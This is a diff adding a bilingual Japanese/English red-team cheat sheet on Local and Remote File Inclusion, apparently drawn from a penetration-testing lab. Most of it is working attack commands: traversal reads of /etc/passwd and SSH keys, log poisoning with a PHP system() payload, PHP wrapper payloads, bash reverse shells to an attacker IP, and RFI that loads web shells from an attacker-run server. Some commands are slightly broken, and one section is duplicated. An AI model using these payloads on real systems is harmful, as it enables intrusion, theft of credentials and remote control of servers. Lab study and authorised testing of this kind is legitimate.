@@ -1,0 +1,285 @@
+---
+title: File Inclusion
+parent: Web Attack
+grand_parent: Red Team
+---
+
+# 概要
+
+**Local File Inclusion (LFI)** は、攻撃者がサーバー上のファイルを含めることで、リモートからシステムの情報を取得したり、コマンドを実行したりする攻撃手法です。  
+一方、**Remote File Inclusion (RFI)** は、リモートのファイルをサーバーに含めて、任意のコードを実行する攻撃手法です。
+#### LFIとRFIの違い
+- LFIはサーバー上のローカルファイルをインクルードします。
+- RFIはリモートからのファイルをインクルードします。
+#### LFIとディレクトリトラバーサルの違い
+- ディレクトリトラバーサル ファイルの内容を読み取るのみ
+- ローカルファイルまたはリモートファイルを実行できる
+
+---
+# Local File Inclusion (LFI)
+
+<details markdown="1">
+<summary>LFI</summary>
+
+```bash
+http://<IP>/index.php?page=../../../../etc/passwd
+```
+
+```bash
+curl http://<IP>/index.php?file=../../../../home/user/.ssh/id_rsa
+```
+
+If vulnerable → read files / get creds
+
+#### Example:
+- [Executing a Command](web_lfi_executing-a-command.md)
+- [Log Poisoning](web_lfi_executing-a-command.md)
+
+---
+
+# Handling Spaces in Commands
+
+If the command you are sending contains spaces, as shown below, an error may occur.
+```bash
+ls -la
+cat /etc/passwd
+```
+
+## Solution
+Use IFS to change how spaces are interpreted
+```bash
+IFS=‘ ’  # Set IFS to space
+input="cat /etc/passwd"
+
+read -r cmd arg <<< “$input”
+$cmd $arg
+```
+In the example above, spaces are interpreted as %20
+```bash
+curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=ls%20-ls HTTP/1.1
+```
+
+
+
+#### コマンド実行の例
+
+以下のURLを使用して、リモートでコマンドを実行します：
+```bash
+http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+```
+上記の例では、whoamiコマンドをcmdパラメータに渡して実行しています。
+
+- リバースシェルの実行
+リバースシェルを実行するには、次のコマンドをcmdパラメータに渡します：
+```bash
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+```
+
+- URLエンコードされたリバースシェル
+次のように、リバースシェルコマンドをURLエンコードして送信します：
+```bash
+%20-c%20%22```bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+```
+
+- PHP Wrapperを利用したLFI
+PHPのWrapperを使用して、ファイルの内容をリモートから取得します：
+
+```bash
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
+```
+
+```bash
+curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php"
+```
+
+---
+## 例　ログポイズニング
+### /var/log/apache2/access.logにコードを書き込む
+1. curlを使って、発見したディレクトリトラバーサルの脆弱性を利用してファイルaccess.logを表示
+
+```bash
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+```
+
+## 出力
+```
+192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
+...
+```
+
+ログエントリにユーザーエージェントが含まれていることを示している。
+
+### 以降Burpを使用
+
+2. リクエストを送信する前に、Burpでユーザーエージェントを変更し、 access.logファイル に書き込む内容を指定する。
+```bash
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+```
+![[Pasted image 20260429180653.png]]
+
+3. 送信
+- User-Agent内のphpコードがaccess.logに書き込まれる
+- 以降、ターゲット システムでコマンドを実行できるようになり、これを利用して除法取得、リバース シェルの取得及びSSH キーを ユーザーのauthorized_keysファイルに追加したりできるようになる
+3. 情報の取得
+```bash
+# Burp RepeaterのGETの行を以下に書き換え送信
+# cmd=id
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
+
+# cmd=dir
+GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1
+
+# cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
+GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
+```
+![[Pasted image 20260429180702.png]]
+5. リバースシェル
+ncで待ち受ける
+```bash
+nc -nlvp 4444
+```
+以下をエンコードする
+```bash
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+⏬ URLエンコード
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+```
+送信
+```bash
+curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+```
+結果
+```bash
+kali@kali:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
+bash: cannot set terminal process group (24): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+![[Pasted image 20260429180713.png]]
+---
+# コマンド内のスペースの対応
+## 概要
+送信するコマンドに以下のようにスペースが入っているとエラーになる場合がある
+```bash
+ls -la
+cat /etc/passwd
+```
+
+## 対処方法
+IFSを使用して、スペースの解釈方法を変更する
+```bash
+IFS=' '  # Set IFS to space
+input="cat /etc/passwd"
+
+read -r cmd arg <<< "$input"
+$cmd $arg
+```
+上記の例ではスペースは%20と解釈される
+```bash
+curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=ls%20-ls HTTP/1.1
+```
+
+
+</details>
+
+---
+---
+
+
+<details markdown="1">
+<summary>RFI</summary>
+
+# Remote File Inclusion
+
+
+# 概要
+- Remote File Inclusion (RFI) は、リモートのファイルをサーバーに含めて、任意のコードを実行する攻撃手法。
+- RFI を利用するには **allow_url_include**オプションを有効にする必要がある。
+
+```ini
+allow_url_include = Off
+```
+- Kali Linuxに**は、/usr/share/webshel​​ls/php/**ディレクトリに RFIに使用できるPHP_ウェブシェルが複数含まれている。
+- Webシェルは、ウェブベースのコマンドラインインターフェースを提供する小さなスクリプト
+---
+
+```bash
+http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+```
+If vulnerable → [ReverseShell](ReverseShell.md)
+
+```zsh
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
+```
+#### Example:
+- [ RFI Using an Existing Web Shell File](web_lfi_executing-a-command.md)
+-  [Using Pentestmonkey](web_lfi_executing-a-command.md)
+ [5_php_wrapper](5_php_wrapper.md)
+*By using a wrapper, it is possible to bypass filters in PHP web applications or execute code by exploiting file inclusion vulnerabilities.*
+
+---
+# 例１ 既存のWebシェルファイルを利用したRFI
+
+## 手順
+1. 攻撃者側の準備
+-　Webシェルファイルの準備
+```bash
+cp /usr/share/webshells/php/simple-backdoor.php ./
+```
+- Webサーバの準備
+```bash
+python3 -m http.server 80
+```
+2. RFIの実行
+```bash
+# ls
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+
+# cat /etc/passwd
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
+
+# コマンドの結果の１行のみ出力したい場合
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=whoami" | grep "<pre>"
+
+# ユーザ（elaine）のauthorized_key
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
+```
+
+---
+# 例２ Pentestmonkeyの活用
+## 1. 攻撃者側の準備
+-　Webシェルファイルの準備
+```bash
+# ファイルのコピー
+cp ~/github/ReverseShell/php-reverse-shell/php-reverse-shell.php ./
+
+# 該当行を変更
+# $ip変数 Kali マシンの IP アドレス
+# $portを 4444 
+$ip = '192.168.45.204';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+```
+- Webサーバの準備
+```bash
+python3 -m http.server 80
+```
+- netcatの準備
+```bash
+nc -nlvp 4444
+```
+
+2. RFIの実行
+```bash
+curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.204/php-reverse-shell.php"
+```
+
+---
+
+### 参考サイト
+- Qiita - LFI攻撃
+- Hacking Articles - Local File Inclusionの包括的ガイド
+- Medium - Local File Inclusion (LFI) Web Application Penetration Testing
+
+
+</details>
